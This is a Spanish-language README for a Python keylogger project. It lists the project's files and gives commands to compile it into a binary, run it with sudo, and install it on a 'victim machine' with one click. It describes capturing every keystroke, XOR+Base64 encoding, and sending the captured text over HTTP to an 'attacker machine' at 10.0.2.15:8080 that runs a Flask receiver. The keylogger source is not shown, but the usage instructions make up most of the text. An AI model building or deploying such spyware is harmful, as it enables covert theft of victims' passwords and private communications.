

## funcionalidades

- captura teclas en tiempo real
- reconstruye texto automaticamente cada 3 segundos
- cifra contenido usando xor + base64
- transmite datos via http a maquina que espera 
- instalacion automatica con un clic

## archivos

- `unified_keylogger.py` - keylogger principal
- `reconstructor.py` - convierte teclas capturadas en texto legible
- `keylogger_auto.sh` - script bash de ejecucion
- `build_keylogger.py` - compilador a ejecutable binario
- `run_keylogger.sh` - lanzador del ejecutable (se genera automaticamente)

## uso

### opcion 1: ejecutable compilado (recomendado)
```bash
# compilar una sola vez
python build_keylogger.py

# ejecutar como programa normal (no necesita chmod)
sudo ./dist/keylogger
```

### opcion 2: script bash
```bash
# hacer ejecutable (solo primera vez)
chmod +x keylogger_auto.sh

# ejecutar
./keylogger_auto.sh
```

### opcion 3: lanzador automatico
```bash
# despues de compilar, usar lanzador
sudo ./run_keylogger.sh
```

## configuracion

configurado para enviar datos a `10.0.2.15:8080`. editar `unified_keylogger.py` linea 390 para cambiar ip destino.

## dependencias

### para compilar:
- python 3.x
- pyinstaller (se instala automaticamente)

### ejecutable compilado incluye:
- pynput (captura de teclas)
- requests (transmision http)
- todas las dependencias necesarias

## instalacion

### opcion 1: compilar ejecutable (recomendado)
```bash
# compilar (instala dependencias automaticamente)
python build_keylogger.py

# resultado: dist/keylogger (ejecutable binario)
```

### opcion 2: instalacion manual
```bash
pip install -r requirements.txt
```


## ¿Qué hace?

Creé un keylogger completo que:
- Captura todas las teclas presionadas en tiempo real
- Reconstruye el texto automáticamente cada 3 segundos
- Cifra el contenido usando XOR + Base64
- Envía los datos cifrados a una máquina atacante remota
- Permite descifrar los datos capturados

## Archivos principales

### Para la máquina víctima:
- `unified_keylogger.py` - El keylogger principal con todas las funcionalidades
- `reconstructor.py` - Convierte las teclas capturadas en texto legible  
- `keylogger_auto.sh` - Ejecutable que instala todo y ejecuta con un solo clic

## Cómo usar

### Máquina atacante (IP: 10.0.2.15):
```bash
python data_receiver.py
```

### Máquina víctima:
```bash
chmod +x keylogger_auto.sh
./keylogger_auto.sh
```

## Tecnologías utilizadas

- **Python** - Lenguaje principal
- **pynput** - Captura de teclas
- **requests** - Comunicación HTTP
- **flask** - Servidor receptor
- **XOR + Base64** - Cifrado simétrico
- **Threading** - Procesamiento concurrente

